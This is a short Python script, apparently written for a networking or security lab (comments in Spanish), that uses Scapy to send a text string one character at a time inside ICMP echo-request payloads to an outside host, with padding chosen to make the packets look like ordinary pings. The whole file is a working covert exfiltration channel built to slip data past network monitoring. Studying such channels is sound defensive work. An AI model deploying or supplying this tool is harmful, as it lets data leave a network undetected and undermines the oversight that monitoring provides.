import sys
import time
from scapy.all import IP, ICMP, send, Raw

def stealth_ping(texto, destino="8.8.8.8"):
    # Generamos un padding hexadecimal típico de un ping real (47 bytes restantes)
    # Esto ayuda a que el tamaño total del payload sea 48 bytes, ocultando la anomalía.
    padding = bytes.fromhex("60090000000000101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637")[:47]

    for char in texto:
        # El carácter a exfiltrar se ubica en el primer byte del payload
        payload = char.encode('utf-8') + padding
        paquete = IP(dst=destino)/ICMP(type=8, code=0)/Raw(load=payload)
        
        # Enviar paquete de forma silenciosa
        send(paquete, verbose=0)
        print("Sent 1 packets.") # Salida solicitada por el laboratorio
        time.sleep(1) # Intervalo estándar de 1 segundo entre pings

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4.py <texto_cifrado>")
        sys.exit(1)

    texto_cifrado = sys.argv[1]
    stealth_ping(texto_cifrado)